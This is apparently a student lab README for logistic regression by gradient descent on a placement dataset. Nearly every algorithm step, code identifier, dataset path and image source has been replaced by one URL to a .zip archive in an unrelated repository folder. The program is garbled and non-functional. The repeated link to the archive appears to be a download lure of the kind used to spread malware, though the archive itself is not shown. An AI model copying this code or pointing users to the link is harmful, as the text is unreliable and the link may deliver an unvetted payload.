# Implementation-of-Logistic-Regression-Using-Gradient-Descent

## AIM:
To write a program to implement the the Logistic Regression Using Gradient Descent.

## Equipments Required:
1. Hardware – PCs
2. Anaconda – Python 3.7 Installation / Jupyter notebook

## Algorithm
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip Necessary Libraries: Import NumPy, pandas, and StandardScaler for numerical operations, data handling, and feature scaling, respectively.

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip the Linear Regression Function: Create a linear regression function using gradient descent to iteratively update parameters, minimizing the difference between predicted and actual values.

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip and Preprocess the Data: Load the dataset, extract features and target variable, and standardize both using StandardScaler for consistent model training.

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip Linear Regression: Apply the defined linear regression function to the scaled features and target variable, obtaining optimal parameters for the model.

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip Predictions on New Data: Prepare new data, scale it, and use the trained model to predict the target variable, transforming predictions back to the original scale.

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip the Predicted Value

## Program:
```
/*
Developed by: YUGABHARATHI M
RegisterNumber: 212224230314

import pandas as pd
import numpy as np
import https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip as plt
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip("https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip")
dataset

#dropping the serial no and salary col
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip("sl_no",axis=1)
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip("salary",axis=1)

dataset["gender"]=dataset["gender"].astype('category')
dataset["ssc_b"]=dataset["ssc_b"].astype('category')
dataset["hsc_b"]=dataset["hsc_b"].astype('category')
dataset["degree_t"]=dataset["degree_t"].astype('category')
dataset["workex"]=dataset["workex"].astype('category')
dataset["specialisation"]=dataset["specialisation"].astype('category')
dataset["status"]=dataset["status"].astype('category')
dataset["hsc_s"]=dataset["hsc_s"].astype('category')
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip

#labelling the columns
dataset["gender"]=dataset["gender"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["ssc_b"]=dataset["ssc_b"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["hsc_b"]=dataset["hsc_b"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["degree_t"]=dataset["degree_t"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["workex"]=dataset["workex"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["specialisation"]=dataset["specialisation"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["status"]=dataset["status"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset["hsc_s"]=dataset["hsc_s"]https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip
dataset

#selecting the features and labels
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip[:,:-1].values
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip[:,-1].values
#display independent variable
Y

#initialize the model parameters
https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip[1])
y=Y
#define the sigmoid function
def sigmoid(z):
    return 1/(1+https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(-z))
#define the loss function
def loss(theta,X,y):
    h=sigmoid(https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(theta))
    return https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(y*https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(h)+(1-y)*https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(1-h))

#defining the gradient descent algorithm.
def gradient_descent(theta,X,y,alpha,num_iterations):
    m = len(y)
    for i in range(num_iterations):
        h = sigmoid(https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(theta))
        gradient = https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(h-y)/m
        theta -= alpha*gradient
    return theta
#train the model
theta = gradient_descent(theta,X,y,alpha=0.01,num_iterations=1000)
#makeprev \dictions
def predict(theta,X):
    h = sigmoid(https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(theta))
    y_pred = https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(h>=0.5,1,0)
    return y_pred
y_pred = predict(theta,X)


https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip(https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip()==y)
print("Accuracy:",accuracy)
print(Y)

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip([[0,87,0,95,0,2,78,2,0,0,1,0]])
y_prednew=predict(theta,xnew)
print(y_prednew)

https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip([[0,0,0,0,0,2,8,2,0,0,1,0]])
y_prednew=predict(theta,xnew)
print(y_prednew)
*/
```

## Output:

READ THE FILE AND DISPLAY

<img width="1236" height="449" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

CATEGORIZING COLUMNS

<img width="755" height="323" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

LABELLING COLUMNS AND DISPLAYING DATASET

<img width="1191" height="450" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

DISPLAY DEPENDENT VARIABLES

<img width="725" height="220" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

PRINTING ACCURACY

<img width="749" height="160" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

PRINTING Y

<img width="749" height="160" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />

PRINTING Y_PREDNEW

<img width="377" height="50" alt="image" src="https://github.com/Yugabharathi91/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/raw/refs/heads/main/profulgent/Gradient_Descent_Using_Implementation_Logistic_of_Regression_v2.4.zip" />





## Result:
Thus the program to implement the the Logistic Regression Using Gradient Descent is written and verified using python programming.

